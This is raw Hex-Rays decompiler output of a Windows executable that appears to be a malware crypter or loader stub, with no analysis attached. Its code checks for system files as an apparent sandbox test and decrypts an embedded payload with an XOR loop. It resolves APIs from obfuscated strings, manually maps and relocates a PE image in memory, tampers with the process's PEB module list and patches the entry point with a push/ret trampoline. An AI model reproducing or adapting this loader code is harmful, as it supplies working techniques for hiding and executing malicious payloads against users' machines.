/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// LPSTR __stdcall GetCommandLineA();
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// HANDLE __stdcall GetProcessHeap();
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
int __cdecl sub_401030(int a1, int a2, int a3);
// int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4);
FARPROC __cdecl sub_401350(HMODULE hModule, LPCSTR lpProcName);
int __cdecl sub_401370(int a1);
int __stdcall sub_4013A0(int a1);
int __cdecl sub_401930(int a1, int a2, int a3);
LPVOID __cdecl sub_4019B0(SIZE_T dwBytes);
int __cdecl sub_4019E0(int a1, int a2);
int __cdecl sub_401B30(int a1);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_4012FB; // weak
_UNKNOWN unk_402001; // weak
CHAR aUnmapviewoffil[136] =
{
  'U',
  'n',
  'm',
  'a',
  'p',
  'V',
  'i',
  'e',
  'w',
  'O',
  'f',
  'F',
  'i',
  'l',
  'e',
  '\0',
  '\0',
  '\0',
  '\0',
  'C',
  'r',
  'e',
  'a',
  't',
  'e',
  'F',
  'i',
  'l',
  'e',
  'M',
  'a',
  'p',
  'p',
  'i',
  'n',
  'g',
  'A',
  '\0',
  'C',
  'l',
  'o',
  's',
  'e',
  'H',
  'a',
  'n',
  'd',
  'l',
  'e',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  'V',
  'i',
  'r',
  't',
  'u',
  'a',
  'l',
  'A',
  'l',
  'l',
  'o',
  'c',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  'V',
  'i',
  'r',
  't',
  'u',
  'a',
  'l',
  'F',
  'r',
  'e',
  'e',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  'M',
  'a',
  'p',
  'V',
  'i',
  'e',
  'w',
  'O',
  'f',
  'F',
  'i',
  'l',
  'e',
  'E',
  'x',
  '\0',
  '\0',
  '\0',
  '\0',
  'L',
  'o',
  'a',
  'd',
  'L',
  'i',
  'b',
  'r',
  'a',
  'r',
  'y',
  'A',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR String2[] = "\\system32\\debug.exe"; // idb
CHAR a2354bb0aabb0ba[] = "2354bb0aabb0ba0b0a0a0argsdg"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
int dword_4072E0 = 0; // weak
int dword_4072E4 = 0; // weak
int dword_4072E8 = 0; // weak
int dword_4072EC = 0; // weak
int dword_4072F0 = 0; // weak
int dword_4072F4 = 0; // weak
int dword_4072F8 = 0; // weak
int dword_4072FC = 0; // weak
int dword_407300 = 0; // weak
HMODULE hModule = NULL; // idb
int dword_407308 = 0; // weak
int (__stdcall *dword_407320)(_DWORD) = NULL; // weak
int (__stdcall *dword_407324)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_407328)(_DWORD) = NULL; // weak
int (__stdcall *dword_40732C)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_407330)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_407334)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_407338)(_DWORD) = NULL; // weak
int (__cdecl *dword_40733C)(_DWORD) = NULL; // weak


//----- (00401030) --------------------------------------------------------
int __cdecl sub_401030(int a1, int a2, int a3)
{
  int result; // eax

  for ( dword_4072E8 = 0; dword_4072E8 < a3; ++dword_4072E8 )
  {
    *(_BYTE *)(dword_4072E8 + a1) = *(_BYTE *)(dword_4072E8 + a2);
    result = dword_4072E8 + 1;
  }
  return result;
}
// 4072E8: using guessed type int dword_4072E8;

//----- (004010C0) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4)
{
  FARPROC v5; // eax
  CHAR Buffer[304]; // [esp+Ch] [ebp-148h] BYREF
  char *v7; // [esp+13Ch] [ebp-18h]
  HMODULE v8; // [esp+140h] [ebp-14h]
  HANDLE v9; // [esp+148h] [ebp-Ch]
  unsigned int i; // [esp+150h] [ebp-4h]
  int savedregs; // [esp+154h] [ebp+0h] BYREF

  v8 = GetModuleHandleA(0);
  LoadIconA(0, (LPCSTR)0x7F00);
  dword_4072E8 = 1169;
  dword_4072F0 = a4;
  dword_407300 = (_WORD)a4 == 0;
  if ( !a4 )
    dword_407300 = 0;
  if ( dword_407300 )
    v8 = (HMODULE)dword_4072F0;
  GetWindowsDirectoryA(Buffer, 0xE6u);
  lstrcatA(Buffer, String2);
  v9 = CreateFileA(Buffer, 0x80u, 3u, 0, 3u, 0x80u, 0);
  if ( v9 == (HANDLE)-1 )
    return 0;
  lstrcatA(Buffer, a2354bb0aabb0ba);
  v9 = CreateFileA(Buffer, 0x80u, 3u, 0, 3u, 0x80u, 0);
  if ( v9 != (HANDLE)-1 )
    return 0;
  v7 = (char *)&unk_402001;
  dword_4072E8 = 6846;
  for ( i = 0; i < 0x5200; i += 8 )
  {
    GetModuleHandleA(0);
    *(_DWORD *)&v7[i] += i;
    *(_DWORD *)&v7[i] ^= i + 45566668;
  }
  dword_4072FC = (int)sub_4019B0(0x5200u);
  sub_401030(dword_4072FC, (int)v7, 20992);
  dword_4072EC = a2;
  dword_4072E4 = a3;
  dword_4072F8 = a1;
  dword_407308 = (int)NtCurrentTeb();
  dword_4072F4 = (int)&savedregs;
  hModule = GetModuleHandleA(ModuleName);
  for ( i = 0; i < 7; ++i )
  {
    v5 = sub_401350(hModule, &aUnmapviewoffil[19 * i]);
    *(&dword_407320 + i) = (int (__stdcall *)(_DWORD))v5;
  }
  i = (unsigned int)&loc_4012FB;
  sub_4019E0(&loc_4012FB - (_UNKNOWN *)v8, (int)v8);
  sub_4013A0(dword_4072FC);
  if ( dword_407300 )
    a4 = dword_4072FC;
  return dword_40733C(a4);
}
// 40733C: invalid function type has been ignored
// 4072E4: using guessed type int dword_4072E4;
// 4072E8: using guessed type int dword_4072E8;
// 4072EC: using guessed type int dword_4072EC;
// 4072F0: using guessed type int dword_4072F0;
// 4072F4: using guessed type int dword_4072F4;
// 4072F8: using guessed type int dword_4072F8;
// 4072FC: using guessed type int dword_4072FC;
// 407300: using guessed type int dword_407300;
// 407308: using guessed type int dword_407308;
// 407320: using guessed type int (__stdcall *dword_407320)(_DWORD);
// 40733C: using guessed type int (__cdecl *dword_40733C)(_DWORD);

//----- (00401350) --------------------------------------------------------
FARPROC __cdecl sub_401350(HMODULE hModule, LPCSTR lpProcName)
{
  return GetProcAddress(hModule, lpProcName);
}

//----- (00401370) --------------------------------------------------------
int __cdecl sub_401370(int a1)
{
  dword_4072E8 = 1;
  GetCommandLineA();
  return *(_DWORD *)(a1 + 128);
}
// 4072E8: using guessed type int dword_4072E8;

//----- (004013A0) --------------------------------------------------------
int __stdcall sub_4013A0(int a1)
{
  _BYTE *lpAddress; // [esp+4h] [ebp-C0h]
  DWORD flOldProtect[2]; // [esp+8h] [ebp-BCh] BYREF
  _DWORD *v4; // [esp+10h] [ebp-B4h]
  int v5; // [esp+14h] [ebp-B0h]
  _DWORD *v6; // [esp+18h] [ebp-ACh]
  int v7; // [esp+8Ch] [ebp-38h]
  int v8; // [esp+90h] [ebp-34h]
  int *v9; // [esp+94h] [ebp-30h]
  int v10; // [esp+98h] [ebp-2Ch]
  unsigned int v11; // [esp+9Ch] [ebp-28h]
  _DWORD *v12; // [esp+A0h] [ebp-24h]
  int *v13; // [esp+A4h] [ebp-20h]
  _DWORD *j; // [esp+A8h] [ebp-1Ch]
  HMODULE hModule; // [esp+ACh] [ebp-18h]
  int v16; // [esp+B0h] [ebp-14h]
  unsigned int i; // [esp+B4h] [ebp-10h]
  int v18; // [esp+B8h] [ebp-Ch]
  int v19; // [esp+BCh] [ebp-8h]
  int v20; // [esp+C0h] [ebp-4h]

  if ( dword_407300 )
  {
    v5 = dword_4072F0;
    v20 = *(_DWORD *)(dword_4072F0 + *(_DWORD *)(dword_4072F0 + 60) + 80);
  }
  v5 = a1;
  v8 = *(_DWORD *)(a1 + 60) + a1;
  v12 = (_DWORD *)(v8 + *(unsigned __int16 *)(v8 + 20) + 24);
  v10 = dword_40732C(0, *(_DWORD *)(v8 + 80), 12288, 64);
  sub_401030(v10, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v8 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v8 + 6); ++i )
  {
    if ( v12[5] )
    {
      if ( v12[4] )
        sub_401030(
          v12[3] + v10,
          v12[5] + a1,
          *(_DWORD *)(v8 + 60) * ((unsigned int)(v12[4] + *(_DWORD *)(v8 + 60) - 1) / *(_DWORD *)(v8 + 60)));
    }
    v12 += 10;
  }
  v5 = v10;
  v8 = *(_DWORD *)(v10 + 60) + v10;
  v4 = (_DWORD *)(v10 + sub_401370(v8));
  if ( dword_407300 )
    v18 = 0;
  else
    v18 = dword_407324(-1, 0, 4, 0, *(_DWORD *)(v8 + 80), 0);
  while ( v4[4] )
  {
    hModule = (HMODULE)dword_407338(v4[3] + v10);
    GetCommandLineA();
    if ( *v4 )
    {
      v13 = (int *)(*v4 + v10);
      GetCommandLineA();
      v9 = (int *)(v4[4] + v10);
    }
    else
    {
      v13 = (int *)(v4[4] + v10);
      GetCommandLineA();
      v9 = (int *)(*v4 + v10);
    }
    v16 = 0;
    if ( v4[4] && *v4 )
      v16 = 1;
    while ( *v13 )
    {
      if ( *v13 >= 0 )
        *v13 = (int)sub_401350(hModule, (LPCSTR)(*v13 + v10 + 2));
      else
        *v13 = (int)sub_401350(hModule, (LPCSTR)(*v13 & 0x7FFFFFFF));
      if ( v16 )
        *v9 = *v13;
      ++v13;
      GetCommandLineA();
      ++v9;
    }
    GetCommandLineA();
    v4 += 5;
  }
  if ( dword_407300 )
    dword_4072E0 = 0;
  else
    dword_4072E0 = dword_407334(v18, 34, 0, 0, 0, *(_DWORD *)(v8 + 52));
  if ( !dword_4072E0 )
  {
    flOldProtect[1] = 1;
    if ( dword_407300 )
      v19 = dword_4072F0;
    else
      v19 = *(_DWORD *)(v8 + 52);
    if ( !dword_407320(v19) && !dword_407330(v19, 0, 0x8000) )
      return 0;
    if ( dword_407300 )
    {
      dword_40732C(v19, v20, 12288, 64);
    }
    else
    {
      dword_4072E0 = dword_407334(v18, 34, 0, 0, 0, *(_DWORD *)(v8 + 52));
      if ( !dword_4072E0 )
        dword_4072E0 = dword_40732C(*(_DWORD *)(v8 + 52), *(_DWORD *)(v8 + 80), 12288, 64);
    }
  }
  if ( dword_407300 )
  {
    dword_4072E0 = v10;
    v7 = v10 - *(_DWORD *)(v8 + 52);
    if ( *(_DWORD *)(v8 + 164) )
    {
      for ( j = (_DWORD *)(*(_DWORD *)(v8 + 160) + v5); j[1]; j = (_DWORD *)((char *)j + j[1]) )
      {
        v11 = (unsigned int)(j[1] - 8) >> 1;
        v6 = j + 2;
        for ( i = 0; i < v11; ++i )
        {
          if ( (int)*((unsigned __int16 *)v6 + i) >> 12 == 3 )
            *(_DWORD *)(*j + v10 + (*((_WORD *)v6 + i) & 0xFFF)) += v7;
        }
      }
    }
    dword_40733C = (int (__cdecl *)(_DWORD))(*(_DWORD *)(v8 + 40) + dword_4072E0);
    lpAddress = (_BYTE *)(*(_DWORD *)(v8 + 40) + v19);
    v5 = dword_4072F0;
    *(_WORD *)(v8 + 22) |= 0x2000u;
    VirtualProtect(lpAddress, 6u, 0x40u, flOldProtect);
    *lpAddress = 104;
    *(_DWORD *)(lpAddress + 1) = dword_40733C;
    lpAddress[5] = -61;
    dword_4072FC = dword_4072E0;
    sub_401930(dword_4072F0, *(_DWORD *)(v8 + 40) + dword_4072E0, dword_4072E0);
  }
  else
  {
    sub_401030(dword_4072E0, v10, *(_DWORD *)(v8 + 80));
    dword_407328(v18);
    sub_401B30(dword_4072E0);
    dword_40733C = (int (__cdecl *)(_DWORD))(*(_DWORD *)(v8 + 40) + dword_4072E0);
    *(_DWORD *)(v8 + 40) = dword_40733C;
  }
  return 1;
}
// 4072E0: using guessed type int dword_4072E0;
// 4072F0: using guessed type int dword_4072F0;
// 4072FC: using guessed type int dword_4072FC;
// 407300: using guessed type int dword_407300;
// 407320: using guessed type int (__stdcall *dword_407320)(_DWORD);
// 407324: using guessed type int (__stdcall *dword_407324)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407328: using guessed type int (__stdcall *dword_407328)(_DWORD);
// 40732C: using guessed type int (__stdcall *dword_40732C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 407330: using guessed type int (__stdcall *dword_407330)(_DWORD, _DWORD, _DWORD);
// 407334: using guessed type int (__stdcall *dword_407334)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407338: using guessed type int (__stdcall *dword_407338)(_DWORD);
// 40733C: using guessed type int (__cdecl *dword_40733C)(_DWORD);

//----- (00401930) --------------------------------------------------------
int __cdecl sub_401930(int a1, int a2, int a3)
{
  _DWORD *v4; // [esp+4h] [ebp-8h]

  v4 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_407308 + 48) + 12) + 12);
  do
  {
    if ( !v4 )
      return 0;
    if ( v4[6] == a1 )
    {
      v4[7] = a2;
      v4[6] = a3;
      return 1;
    }
    v4 = (_DWORD *)*v4;
  }
  while ( v4 != *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_407308 + 48) + 12) + 12) );
  return 0;
}
// 407308: using guessed type int dword_407308;

//----- (004019B0) --------------------------------------------------------
LPVOID __cdecl sub_4019B0(SIZE_T dwBytes)
{
  HANDLE v1; // eax

  GetCommandLineA();
  v1 = GetProcessHeap();
  return HeapAlloc(v1, 0, dwBytes);
}

//----- (004019E0) --------------------------------------------------------
int __cdecl sub_4019E0(int a1, int a2)
{
  _DWORD *v3; // [esp+8h] [ebp-1Ch]
  int v4; // [esp+Ch] [ebp-18h]
  int *v5; // [esp+14h] [ebp-10h]
  unsigned int v6; // [esp+18h] [ebp-Ch]
  _DWORD *i; // [esp+1Ch] [ebp-8h]
  unsigned int j; // [esp+20h] [ebp-4h]

  v5 = (int *)(*(_DWORD *)(a2 + 60) + a2);
  dword_4072E0 = dword_40732C(0, v5[20], 12288, 64);
  if ( dword_4072E0 )
  {
    sub_401030(dword_4072E0, a2, v5[20]);
    v4 = dword_4072E0 - a2;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)(v5[40] + a2); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v6 = (unsigned int)(i[1] - 8) >> 1;
        v3 = i + 2;
        for ( j = 0; j < v6; ++j )
        {
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4072E0 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { retn }
  }
  return 2;
}
// 4072E0: using guessed type int dword_4072E0;
// 40732C: using guessed type int (__stdcall *dword_40732C)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401B30) --------------------------------------------------------
int __cdecl sub_401B30(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_407308 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 407308: using guessed type int dword_407308;

// nfuncs=9 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled
